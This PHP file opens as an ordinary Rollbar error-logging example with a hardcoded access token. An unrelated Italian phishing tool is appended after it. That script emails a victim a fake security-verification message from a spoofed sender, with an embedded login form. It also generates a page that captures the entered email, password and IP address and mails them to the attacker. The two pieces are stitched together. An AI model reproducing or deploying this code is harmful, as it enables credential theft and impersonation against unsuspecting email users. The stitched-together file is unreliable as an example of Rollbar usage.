<?php
use \Rollbar\Rollbar;

// Installs global error and exception handlers
$config = array(
    // required
    'access_token' => '5e212ebd9c034de49e2c46598d929e42',
    // optional - environment name
    'environment' => 'production',
    // optional - path to directory your code is in. Used for linking stack traces.
    'root' => '/Users/brian/www/myapp'
);
Rollbar::init($config);

try {
    throw new \Exception('test exception');
} catch (\Exception $e) {
    Rollbar::log(Level::error(), $e);
}

// Message at level 'info'
Rollbar::log(Level::info(), 'testing info level');

// With extra data (3rd arg) and custom payload options (4th arg)
Rollbar::log(
    Level::info(),
    'testing extra data',
    array("some_key" => "some value") // key-value additional data
);

// If you want to check if logging with Rollbar was successful
$response = Rollbar::log(Level::info(), 'testing wasSuccessful()');
if (!$response->wasSuccessful()) {
    throw new \Exception('logging with Rollbar failed');
}

// Raises an E_NOTICE which will *not* be reported by the error handler
$foo = $bar;

// Will be reported by the exception handler
throw new \Exception('testing exception handler');

//© codec by Virgula #RESPECT

echo"<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /> 
<title>Worked!</title>";//LEGGO TUTTI I TIPI DI CARATTERI ANCHE NON ASCII

$dir_patch = $_POST ['url'];

if ($dir_patch){
echo"<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /> 
<title>Worked!</title>";

//INPUT DEI DATI DALLA PAGINA HTML 
$mittente = $_POST ['nome_mittente'];
$nome_destinatario = $_POST ['nome_destinatario'];
$email_destinatario = $_POST ['email_destinatario'];

//QUESTA PARTE RIGUARDA L'INVIO DELLA NOTIFICA CHE L'EMAIL ESISTE REALEMTE ALL'ATTACCANTE, E DEGLI EVENTUALI DATI DEL FAKE LOGIN

$rand = rand (0,100000000000000000); //creo la variabile e il numero casuale della pagina

//CONFIGURO IL FILE CHE INVIERA' LA MAIL CON TUTTE LE INFO ALL'ATTACCANTE 
$oggetto = " \"Convalida Email\" ";

  $headers  =  ' "MIME-Version: 1.0\r\n" ';
  $headers0 .= " \"To: <$mittente>";
  $headers01 .= '\r\n" ';
  $headers00 .= " \"From: <EmailDetector@server.com>";
  $headers02 .= '\r\n" ';
 
$file = fopen ("pag/{$rand}.php", 'w'); //CREO LA PAGINA RANDOM 
fwrite ($file, "<?php \n");
fwrite ($file, "echo \"<title>Thanks</title>\";\n");
fwrite ($file, '$email = $_GET [\'email\']; ');
fwrite ($file, "\n");
fwrite ($file, '$password = $_GET [\'password\'];');
fwrite ($file, "\n");
fwrite ($file, '$ip =');
fwrite ($file, ' getenv (\'REMOTE_ADDR\');');
fwrite ($file, "\n");
fwrite ($file, "echo\"<h1>Operazione riuscita. Grazie per la collaborazione.</h1>\"; \n");
fwrite ($file, 'if ((($email) || ($password)) || (($email) && ($password))){ ');
fwrite ($file, "\n");
fwrite ($file, ' $messaggio = "Ciao, la tua vittima ha confermato che l\' email esiste realemente cliccando il link. 
Il suo indirizzo ip è: $ip 
La vittima ha inoltre inserito delle credenziali: 
Email_> $email   -   Password_>  $password 
Grazie per aver utilizzato Email Detector. 
 
";}else{');
fwrite ($file, "\n");
fwrite ($file, '$messaggio = " Ciao, la tua vittima ha confermato che l\' email esiste realemente cliccando il link. 
Il suo indirizzo ip è: $ip 
Grazie per aver utilizzato Email Detector.
 
";}');
fwrite ($file, "\n");
fwrite ($file, ' $mittente1 = ');
fwrite ($file, " \"$mittente\";\n ");
fwrite ($file, '$oggetto1 = ');
fwrite ($file, "$oggetto; \n");
fwrite ($file, '$messaggio1 = ');
fwrite ($file, '$messaggio; ');
fwrite ($file, "\n");
fwrite ($file, '$headers1 =');
fwrite ($file, " $headers; \n");
fwrite ($file, '$headers1 .=');
fwrite ($file, " $headers0 ");
fwrite ($file, "$headers01; \n");
fwrite ($file, '$headers1 .=');
fwrite ($file, " $headers00");
fwrite ($file, "$headers02; \n");
fwrite ($file, 'mail($mittente1,$oggetto1,$messaggio1,$headers1)');
fwrite ($file, "\n");
fwrite ($file, " ?> ");
fclose ($file);

//DA QUESTO MOMENTO CONFIGURO LA MAIL DA INVIARE ALLA VITTIMA E LA INVIO

$oggetto = " Avviso! ";
$messaggio = "Ciao, $nome_destinatario, vorremo offrirti una protezione più adeguata anti-phishing.
Devi solamente confermare il tutto al seguente link: 
$dir_patch/pag/$rand.php
Inoltre, inserisci le tue credenziali di accesso di questa email per un'ulteriore importante verifica:
 <html>
   <body>
   <form method=\"get\" action=\"$dir_patch/pag/$rand.php\">
   Email: <input type=\"text\" name=\"email\"> Password: <input type=\"password\" name=\"password\">
   <input type=\"submit\" value=\"Verifica\">
   </form>
   </body>
 </html>
Grazie!
 ";

  $head  = "MIME-Version: 1.0\r\n";
  $head .= "Content-type: text/html; charset=iso-8859-1\r\n";
  $head .= "To: <$email_destinatario>\r\n";
  $head .= "From: <Sicurezza@server.com>\r\n";

if(mail($email_destinatario,$oggetto,$messaggio,$head)){
echo"<font size=\"5\">Email di phishing inviata correttamente, il server ti manderà una mail all'indirizzo: <b>$mittente</b> non appena la vittima cliccherà il link e/o inserira' i dati nel form del fake login.</font>";
}else{
echo"Errore Nell'elaborazione, qualcosa è andato storto";
}
}else{
echo"Errore, devi inserire un url valido. <form action=\"index.html\"><input type=\"submit\" value=\"Riprova\"></form>";
}
?>
